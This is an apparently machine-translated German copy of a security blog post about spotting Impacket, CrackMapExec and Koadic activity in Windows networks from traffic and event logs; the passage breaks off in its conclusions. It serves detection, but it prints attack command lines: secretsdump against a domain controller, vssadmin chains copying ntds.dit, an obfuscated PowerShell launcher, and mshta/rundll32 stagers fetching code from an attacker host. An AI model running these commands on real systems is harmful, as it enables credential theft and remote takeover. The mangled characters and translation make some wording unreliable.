<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üïî ü§° üö¶ So erkennen Sie Angriffe auf die Windows-Infrastruktur: Erkunden von Hacker-Tools ‚ôàÔ∏è üßùüèº üïµüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die Anzahl der Angriffe im Unternehmenssektor nimmt von Jahr zu Jahr zu: So wurden 2017 13% mehr eindeutige Vorf√§lle registriert als 2016, und bis End...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>So erkennen Sie Angriffe auf die Windows-Infrastruktur: Erkunden von Hacker-Tools</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  Die Anzahl der Angriffe im Unternehmenssektor nimmt von Jahr zu Jahr zu: So wurden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">2017 13% mehr eindeutige Vorf√§lle registriert</a> als 2016, und bis Ende 2018 wurden <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">27% mehr Vorf√§lle</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">registriert</a> als in der Vorperiode.  Einschlie√ülich derer, bei denen das Windows-Betriebssystem das Hauptwerkzeug ist.  In den Jahren 2017-2018 griffen die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppen</a> APT Dragonfly, APT28 und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">APT MuddyWater</a> Regierungs- und Milit√§rorganisationen in Europa, Nordamerika und Saudi-Arabien an.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Daf√ºr</a> verwendeten sie drei Tools - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Impacket</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">CrackMapExec</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Koadic</a> .  Ihr Quellcode ist offen und auf GitHub verf√ºgbar. <br><br>  Es ist erw√§hnenswert, dass diese Tools nicht f√ºr die anf√§ngliche Durchdringung verwendet werden, sondern f√ºr die Entwicklung eines Angriffs innerhalb der Infrastruktur.  Angreifer verwenden sie in verschiedenen Phasen des Angriffs, nachdem sie den Umkreis √ºberwunden haben.  Dies ist √ºbrigens schwer zu erkennen und oft nur mit Hilfe von Technologien, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">um Spuren von Kompromissen im Netzwerkverkehr</a> zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">identifizieren,</a> oder mit Tools, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">die die aktiven Aktionen eines Angreifers erkennen</a> k√∂nnen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">, nachdem er in die Infrastruktur eingedrungen ist</a> .  Die Tools bieten viele Funktionen - von der √úbertragung von Dateien √ºber die Interaktion mit der Registrierung bis hin zur Ausf√ºhrung von Befehlen auf einem Remotecomputer.  Wir haben diese Tools untersucht, um ihre Netzwerkaktivit√§t zu bestimmen. <a name="habracut"></a><br><br>  Was wir tun mussten: <br><br><ul><li>  <b>Verstehen Sie, wie Hacking-Tools funktionieren</b> .  Finden Sie heraus, welche Angreifer zum Betrieb ben√∂tigt werden und welche Technologien sie verwenden k√∂nnen. </li><li>  <b>Finden Sie heraus, was in den ersten Phasen eines Angriffs von Informationssicherheitstools nicht erkannt wird</b> .  Die Intelligenzphase kann √ºbersprungen werden, entweder weil der Angreifer ein interner Angreifer ist oder weil der Angreifer eine L√ºcke in der Infrastruktur ausnutzt, die zuvor nicht bekannt war.  Es besteht die M√∂glichkeit, die gesamte Kette seiner Handlungen wiederherzustellen, daher der Wunsch, weitere Bewegungen zu erkennen. </li><li>  <b>Beseitigen Sie Fehlalarme von Intrusion Detection-Tools</b> .  Wir d√ºrfen nicht vergessen, dass h√§ufige Fehler m√∂glich sind, wenn bestimmte Aktionen nur auf der Grundlage von Intelligenz erkannt werden.  Normalerweise gibt es in der Infrastruktur eine ausreichende Anzahl von M√∂glichkeiten, die auf den ersten Blick nicht von den legitimen zu unterscheiden sind, um Informationen zu erhalten. </li></ul><br>  Was geben diese Tools Angreifern?  Wenn dies Impacket ist, erhalten die Angreifer eine gro√üe Bibliothek von Modulen, die in verschiedenen Phasen des Angriffs verwendet werden k√∂nnen, nachdem sie den Perimeter durchbrochen haben.  Viele Tools verwenden Impacket-Module in sich selbst - zum Beispiel Metasploit.  Es verf√ºgt √ºber dcomexec und wmiexec f√ºr die Ausf√ºhrung von Remotebefehlen und Secretsdump zum Abrufen von Konten aus dem Speicher, die aus Impacket hinzugef√ºgt wurden.  Infolgedessen wird der korrekte Nachweis der Aktivit√§t einer solchen Bibliothek auch durch den Nachweis von Derivaten sichergestellt. <br><br>  √úber CrackMapExec (oder einfach nur CME) haben die Macher zuf√§llig "Powered by Impacket" geschrieben.  Dar√ºber hinaus verf√ºgt CME √ºber vorgefertigte Funktionen f√ºr beliebte Szenarien: Dies ist Mimikatz zum Empfangen von Passw√∂rtern oder deren Hashes sowie die Implementierung von Meterpreter oder des Empire-Agenten f√ºr die Remote-Ausf√ºhrung und Bloodhound an Bord. <br><br>  Das dritte Werkzeug, das wir ausgew√§hlt haben, ist Koadic.  Es ist ziemlich frisch, wurde auf der internationalen Hacker-Konferenz DEFCON 25 im Jahr 2017 vorgestellt und verfolgt einen nicht standardm√§√üigen Ansatz: Arbeiten √ºber HTTP, Java Script und Microsoft Visual Basic Script (VBS).  Dieser Ansatz wird als Leben vom Land bezeichnet: Das Tool verwendet eine Reihe von Abh√§ngigkeiten und Bibliotheken, die in Windows integriert sind.  Die Ersteller nennen es COM Command Control oder C3. <br><br><h2>  IMPACKET </h2><br>  Die Funktionalit√§t von Impacket ist sehr umfangreich und reicht von der Aufkl√§rung in AD √ºber das Sammeln von Daten von internen MS SQL-Servern bis hin zu Techniken zum Abrufen von Anmeldeinformationen: Dies ist ein SMB-Relay-Angriff und der Empfang einer ntds.dit-Datei mit Benutzerkennwort-Hashes von einem Dom√§nencontroller.  Impacket f√ºhrt Befehle auch remote mit vier verschiedenen Methoden aus: √ºber WMI, einen Dienst zum Verwalten des Windows-Schedulers, DCOM und SMB, f√ºr den Anmeldeinformationen erforderlich sind. <br><br><h3>  Secretsdump </h3><br>  Schauen wir uns Secretsdump an.  Dies ist ein Modul, dessen Zweck sowohl Benutzercomputer als auch Dom√§nencontroller sein k√∂nnen.  Mit dieser Funktion k√∂nnen Sie Kopien der Speicherbereiche LSA, SAM, SECURITY und NTDS.dit abrufen, sodass sie in verschiedenen Phasen des Angriffs angezeigt werden k√∂nnen.  Der erste Schritt beim Betrieb des Moduls ist die Authentifizierung √ºber SMB, f√ºr die entweder ein Benutzerkennwort oder ein Hash erforderlich ist, um den Pass the Hash-Angriff automatisch durchzuf√ºhren.  Als N√§chstes wird eine Anforderung zum √ñffnen des Zugriffs auf Service Control Manager (SCM) und zum Zugriff auf die Registrierung mithilfe des Winreg-Protokolls angezeigt, mit dem ein Angreifer die Daten von Zweigen ermitteln kann, die ihn interessieren, und √ºber SMB Ergebnisse erzielen kann. <br><br>  In Abb.  In 1 sehen wir, wie genau bei Verwendung des Winreg-Protokolls der Zugriff durch den Registerschl√ºssel bei LSA erfolgt.  Verwenden Sie dazu den DCERPC-Befehl mit Opcode 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Abb.</i>  <i>1. √ñffnen Sie den Registrierungsschl√ºssel mit dem Winreg-Protokoll</i> <br><br>  Wenn der Schl√ºsselzugriff erhalten wird, werden die Werte mit dem Befehl SaveKey mit Opcode 20 gespeichert. Impacket macht dies sehr spezifisch.  Die Werte werden in einer Datei gespeichert, deren Name aus 8 zuf√§lligen Zeichen besteht. Hinzu kommt .tmp.  Dar√ºber hinaus erfolgt das weitere Entladen dieser Datei √ºber SMB aus dem System32-Verzeichnis (Abb. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Abb.</i>  <i>2. Schema zum Abrufen eines Registrierungsschl√ºssels von einem Remotecomputer</i> <br><br>  Es stellt sich heraus, dass Sie solche Aktivit√§ten im Netzwerk erkennen k√∂nnen, indem Sie bestimmte Registrierungszweige mithilfe des Winreg-Protokolls, bestimmter Namen, Befehle und ihrer Reihenfolge abfragen. <br><br>  Dieses Modul hinterl√§sst auch Spuren im Windows-Ereignisprotokoll, aufgrund derer es leicht erkannt werden kann.  Zum Beispiel als Ergebnis eines Befehls <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  Im Windows Server 2016-Protokoll wird die folgende Schl√ºsselsequenz von Ereignissen angezeigt: <br><br>  1. 4624 - Remote-Anmeldung. <br>  2. 5145 - √úberpr√ºfung der Zugriffsrechte auf den Remote-Winreg-Dienst. <br>  3. 5145 - √úberpr√ºfen der Dateiberechtigungen im System32-Verzeichnis.  Die Datei hat den oben genannten zuf√§lligen Namen. <br>  4. 4688 - Erstellen des Prozesses cmd.exe, mit dem vssadmin gestartet wird: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - Erstellen eines Prozesses mit dem Befehl: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - Erstellen eines Prozesses mit dem Befehl: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - Erstellen eines Prozesses mit dem Befehl: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Wie viele Tools nach der Ausnutzung verf√ºgt Impacket √ºber Module f√ºr die Ausf√ºhrung von Remotebefehlen.  Wir werden uns auf smbexec konzentrieren, das eine interaktive Shell auf einem Remote-Computer bereitstellt.  Dieses Modul erfordert auch eine SMB-Authentifizierung mit einem Kennwort oder einem Hash.  In Abb.  3 Wir sehen ein Beispiel f√ºr die Funktionsweise eines solchen Tools. In diesem Fall handelt es sich um eine lokale Administratorkonsole. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Abb.</i>  <i>3. Smbexec Interactive Console</i> <br><br>  Der erste Schritt in smbexec nach der Authentifizierung ist das √ñffnen des SCM mit dem Befehl OpenSCManagerW (15).  Die Anfrage ist bemerkenswert: Darin ist das Feld Maschinenname auf DUMMY gesetzt. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Abb.</i>  <i>4. Fordern Sie an, Service Control Manager zu √∂ffnen</i> <br><br>  Als N√§chstes wird ein Dienst mit dem Befehl CreateServiceW (12) erstellt.  Im Fall von smbexec k√∂nnen wir jedes Mal die gleiche Logik der Teambildung sehen.  In Abb.  5 gr√ºn zeigt die unver√§nderlichen Parameter des Befehls an, gelb - was der Angreifer √§ndern kann.  Es ist leicht zu bemerken, dass der Name der ausf√ºhrbaren Datei, ihres Verzeichnisses und der Ausgabedatei ge√§ndert werden kann, der Rest kann jedoch viel schwieriger ge√§ndert werden, ohne die Logik des Impacket-Moduls zu verletzen. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Abb.</i>  <i>5. Fordern Sie an, einen Dienst mit Service Control Manager zu erstellen</i> <br><br>  Smbexec hinterl√§sst auch eindeutige Spuren im Windows-Ereignisprotokoll.  Im Windows Server 2016-Protokoll f√ºr die interaktive Shell mit dem Befehl ipconfig wird die folgende Schl√ºsselsequenz von Ereignissen angezeigt: <br><br>  1. 4697 - Installation des Dienstes auf dem Computer des Opfers: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - Erstellung des Prozesses cmd.exe mit den Argumenten aus Absatz 1. <br>  3. 5145 - √úberpr√ºfen der Berechtigungen f√ºr die __output-Datei im C $ -Verzeichnis. <br>  4. 4697 - Installation des Dienstes auf dem Computer des Opfers. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - Erstellen des Prozesses cmd.exe mit den Argumenten aus Absatz 4. <br>  6. 5145 - √úberpr√ºfen der Zugriffsrechte auf die __output-Datei im C $ -Verzeichnis. <br><br>  Impacket ist die Grundlage f√ºr die Entwicklung von Angriffstools.  Es unterst√ºtzt fast alle Protokolle in der Windows-Infrastruktur und hat gleichzeitig seine eigenen Eigenschaften.  Hier finden Sie spezifische Winreg-Anforderungen sowie die Verwendung der SCM-API mit der charakteristischen Bildung von Befehlen, dem Dateinamenformat und der SMB-Freigabe SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  Das CME-Tool dient in erster Linie dazu, die Routineaktionen zu automatisieren, die ein Angreifer ausf√ºhren muss, um innerhalb des Netzwerks voranzukommen.  Sie k√∂nnen mit dem ber√ºchtigten Empire-Agenten und Meterpreter zusammenarbeiten.  Um Befehle verdeckt auszuf√ºhren, kann das CME sie verschleiern.  Mit Bloodhound (einem separaten Intelligence-Tool) kann ein Angreifer die Suche nach einer aktiven Dom√§nenadministratorsitzung automatisieren. <br><br><h3>  Bluthund </h3><br>  Bloodhound als unabh√§ngiges Tool erm√∂glicht erweiterte Informationen innerhalb des Netzwerks.  Es sammelt Daten √ºber Benutzer, Computer, Gruppen, Sitzungen und wird in Form eines Skripts in PowerShell oder einer Bin√§rdatei geliefert.  LDAP- oder SMB-basierte Protokolle werden zum Sammeln von Informationen verwendet.  Mit dem CME-Integrationsmodul k√∂nnen Sie Bloodhound auf den Computer des Opfers herunterladen, die gesammelten Daten nach der Ausf√ºhrung ausf√ºhren und empfangen, wodurch Aktionen im System automatisiert und weniger auff√§llig gemacht werden.  Die grafische Shell Bloodhound pr√§sentiert die gesammelten Daten in Form von Diagrammen, mit denen Sie den k√ºrzesten Weg vom angreifenden Computer zum Dom√§nenadministrator finden k√∂nnen. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Abb.</i>  <i>6. Bloodhound-Schnittstelle</i> <br><br>  Um auf dem Computer des Opfers ausgef√ºhrt zu werden, erstellt das Modul eine Aufgabe mit ATSVC und SMB.  ATSVC ist eine Schnittstelle f√ºr die Arbeit mit dem Windows Task Scheduler.  CME verwendet seine NetrJobAdd (1) -Funktion, um Aufgaben √ºber das Netzwerk zu erstellen.  Ein Beispiel daf√ºr, was das CME-Modul sendet, ist in Abb. 2 dargestellt.  7: Dies ist ein Aufruf von cmd.exe und dem verschleierten Code als Argumente im XML-Format. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Abb. 7.</i>  <i>Erstellen einer Aufgabe √ºber CME</i> <br><br>  Nachdem die Aufgabe abgeschlossen wurde, startet die Maschine des Opfers Bloodhound selbst. Dies ist im Verkehr zu sehen.  Das Modul zeichnet sich durch LDAP-Abfragen zum Empfangen von Standardgruppen, eine Liste aller Computer und Benutzer in der Dom√§ne aus, die √ºber die SRVSVC NetSessEnum-Anforderung Informationen zu aktiven Benutzersitzungen empfangen. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Abb.</i>  <i>8. Eine Liste der aktiven Sitzungen √ºber SMB abrufen</i> <br><br>  Dar√ºber hinaus wird der Start von Bloodhound auf dem Computer des Opfers mit aktiviertem Audit von einem Ereignis mit der ID 4688 (Prozesserstellung) und dem Prozessnamen <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  Bemerkenswert sind die Befehlszeilenargumente: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Aus Sicht der Funktionalit√§t und Implementierung ist das Modul enum_avproducts sehr interessant.  WMI erm√∂glicht die Verwendung der WQL-Abfragesprache zum Empfangen von Daten von verschiedenen Windows-Objekten. Dies wird im Wesentlichen von diesem CME-Modul verwendet.  Es generiert Anforderungen an die Klassen AntiSpywareProduct und AntiMirusProduct bez√ºglich der auf dem Computer des Opfers installierten Schutzfunktionen.  Um die erforderlichen Daten zu erhalten, stellt das Modul eine Verbindung zum Namespace root \ SecurityCenter2 her, generiert dann eine WQL-Abfrage und erh√§lt eine Antwort.  In Abb.  Abbildung 9 zeigt den Inhalt solcher Anfragen und Antworten.  In unserem Beispiel wurde Windows Defender gefunden. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Abb.</i>  <i>9. Netzwerkaktivit√§t des Moduls enum_avproducts</i> <br><br>  H√§ufig ist die WMI-Pr√ºfung (Trace WMI-Activity) deaktiviert, bei deren Ereignissen Sie n√ºtzliche Informationen zu WQL-Abfragen finden.  Wenn es jedoch aktiviert ist und das Skript enum_avproducts ausgef√ºhrt wird, wird das Ereignis mit der ID 11 gespeichert. Es enth√§lt den Namen des Benutzers, der die Anforderung gesendet hat, und den Namen im Namespace root \ SecurityCenter2. <br><br>  Jedes der CME-Module enth√ºllte seine eigenen Artefakte, sei es spezifische WQL-Abfragen oder die Erstellung eines bestimmten Aufgabentyps im Taskplaner mit Verschleierung und der f√ºr Bloodhound in LDAP und SMB typischen Aktivit√§t. <br><br><h2>  Koadic </h2><br>  Eine Besonderheit von Koadic ist die Verwendung der integrierten Windows-Interpreter JavaScript und VBScript.  In diesem Sinne folgt es dem Trend, vom Land zu leben - das hei√üt, es hat keine externen Abh√§ngigkeiten und verwendet Standard-Windows-Tools.  Dies ist ein Tool f√ºr Full Command &amp; Control (CnC), da nach der Infektion ein ‚ÄûImplantat‚Äú auf der Maschine installiert ist, mit dem es gesteuert werden kann.  Eine solche Maschine wird in der koadischen Terminologie als "Zombie" bezeichnet.  Da Koadic keine Privilegien f√ºr vollwertige Arbeit auf der Seite des Opfers hat, kann er diese mithilfe der UAC-Bypass-Technik erh√∂hen. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Abb.</i>  <i>10. Command Shell Koadic</i> <br><br>  Das Opfer muss die Kommunikation mit dem Command &amp; Control-Server selbst initiieren.  Dazu muss sie eine vorbereitete URI beantragen und den Hauptk√∂rper von Koadic mit einem der Stager ermitteln.  In Abb.  11 zeigt ein Beispiel f√ºr den mshta-Stager. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Abb.</i>  <i>11. Initialisieren einer Sitzung mit einem CnC-Server</i> <br><br>  Anhand der Antwortvariablen WS wird deutlich, dass die Ausf√ºhrung √ºber WScript.Shell erfolgt und die Variablen STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE wichtige Informationen zu den Parametern der aktuellen Sitzung enthalten.  Dies ist das erste Request-Response-Paar in einer HTTP-Verbindung zu einem CnC-Server.  Nachfolgende Anforderungen stehen in direktem Zusammenhang mit der Funktionalit√§t der aufgerufenen Module (Implantate).  Alle Koadic-Module funktionieren nur mit einer aktiven Sitzung mit CnC. <br><br><h3>  Mimikatz </h3><br>  So wie CME mit Bloodhound zusammenarbeitet, arbeitet Koadic mit Mimikatz als eigenst√§ndiges Programm und hat verschiedene M√∂glichkeiten, es auszuf√ºhren.  Unten finden Sie ein Anfrage-Antwort-Paar zum Laden eines Mimikatz-Implantats. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Abb.</i>  <i>12. √úbertragung von Mimikatz nach Koadic</i> <br><br>  M√∂glicherweise stellen Sie fest, wie sich das URI-Format in der Anforderung ge√§ndert hat.  Darin erschien der Wert der Variablen csrf, die f√ºr das ausgew√§hlte Modul verantwortlich ist.  Achten Sie nicht auf ihren Namen;  Wir alle wissen, dass CSRF normalerweise anders verstanden wird.  Als Antwort kam derselbe Hauptteil von Koadic herein, in den der mit Mimikatz verkn√ºpfte Code eingef√ºgt wurde.  Es ist gro√ü genug, ber√ºcksichtigen Sie also die wichtigsten Punkte.  Vor uns liegen die Base64-codierte Mimikatz-Bibliothek, die serialisierte .NET-Klasse, die sie einf√ºgt, und die Argumente zum Ausf√ºhren von Mimikatz.  Das Ergebnis der Ausf√ºhrung wird im Klartext √ºber das Netzwerk √ºbertragen. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Abb.</i>  <i>13. Das Ergebnis der Ausf√ºhrung von Mimikatz auf einem Remotecomputer</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic verf√ºgt auch √ºber Module, mit denen Befehle remote ausgef√ºhrt werden k√∂nnen.  Hier sehen wir die gleiche Methode zum Generieren von URIs und die bekannten Variablen sid und csrf.  Im Fall des Moduls exec_cmd wird dem Text Code hinzugef√ºgt, der Shell-Befehle ausf√ºhren kann.  Der folgende Code wird in der HTTP-Antwort des CnC-Servers angezeigt. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Abb.</i>  <i>14. Der Implantatcode exec_cmd</i> <br><br>  Die GAWTUUGCFI-Variable mit dem bekannten WS-Attribut wird f√ºr die Codeausf√ºhrung ben√∂tigt.  Mit seiner Hilfe ruft das Implantat die Shell auf und verarbeitet zwei Zweige des Codes - shell.exec mit der R√ºckgabe des Ausgabedatenstroms und shell.run ohne R√ºckgabe. <br><br>  Koadic ist kein typisches Werkzeug, aber es hat seine eigenen Artefakte, mit denen es im legitimen Verkehr gefunden werden kann: <br><br><ul><li>  spezielle Bildung von HTTP-Anfragen, </li><li>  Verwenden der winHttpRequests-API, </li><li>  Erstellen eines WScript.Shell-Objekts √ºber ActiveXObject, </li><li>  gro√üer ausf√ºhrbarer K√∂rper. </li></ul><br>  Die anf√§ngliche Verbindung initiiert den Stager, sodass seine Aktivit√§t anhand von Windows-Ereignissen erkannt werden kann.  F√ºr mshta ist dies das Ereignis 4688, in dem √ºber das Erstellen eines Prozesses mit einem Startattribut gesprochen wird: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  W√§hrend der Ausf√ºhrung von Koadic k√∂nnen Sie andere 4688 Ereignisse mit Attributen sehen, die es perfekt charakterisieren: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  Schlussfolgerungen </h2><br>  Das Leben vom Landtrend gewinnt bei Eindringlingen an Beliebtheit.  Sie verwenden die integrierten Windows-Tools und -Mechanismen f√ºr ihre Anforderungen.  Wir sehen, wie die beliebten Tools Koadic, CrackMapExec und Impacket, die diesem Prinzip folgen, zunehmend in APT-Berichten zu finden sind.  Die Anzahl der Gabeln auf GitHub f√ºr diese Tools w√§chst ebenfalls, neue erscheinen (jetzt gibt es bereits ungef√§hr tausend).  Der Trend wird aufgrund seiner Einfachheit immer beliebter: Angreifer ben√∂tigen keine 